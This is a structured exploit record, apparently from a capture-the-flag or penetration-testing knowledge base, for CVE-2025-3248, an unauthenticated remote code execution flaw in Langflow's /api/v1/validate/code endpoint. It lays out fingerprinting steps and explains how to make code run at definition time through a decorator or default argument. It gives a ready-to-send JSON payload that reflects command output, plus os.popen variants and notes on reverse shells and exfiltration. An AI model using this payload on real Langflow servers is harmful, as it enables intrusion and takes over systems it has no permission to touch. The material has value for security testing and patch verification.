title: Langflow /api/v1/validate/code Pre-Auth RCE (CVE-2025-3248)
vuln_pattern: Langflow (< 1.3.0) code-validation endpoint compiles and executes attacker-supplied Python without authentication: code placed in a function's default argument or decorator runs at definition time, yielding pre-auth remote code execution.
exploit_steps: Fingerprint Langflow (branding, /api/v1 routes, the flow builder) and locate the unauthenticated POST /api/v1/validate/code endpoint.

Craft a Python snippet whose payload executes at DEFINITION time (not call time), because the endpoint only compiles/validates: put the command in a function default argument or a decorator, e.g. `def x(a=os.system('...')): pass` or a decorator that runs the command.
POST the snippet as the 'code' field; the server exec()s the module body while validating, running your command.
Use the RCE to read the flag (reverse shell, or direct command output if reflected) and exfiltrate.
key_payloads: canonical vulhub PoC (decorator + raise to REFLECT output in the error body): {"code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef foo():\n  pass"}
decorator/default-arg variants: any expression evaluated at definition time — @exec(...), def f(a=__import__('os').popen(cmd).read()): pass
reverse shell via os/subprocess in a default-arg expression when output is not reflected
source: original: CVE-2025-3248 public advisory (validate/code default-arg exec method)
preconditions: HTTP access to the Langflow API
verify_oracle: command output containing the flag is returned or exfiltrated
pitfalls: a top-level statement may only be validated, not run — put the payload where it executes at DEFINITION (default arg / decorator)
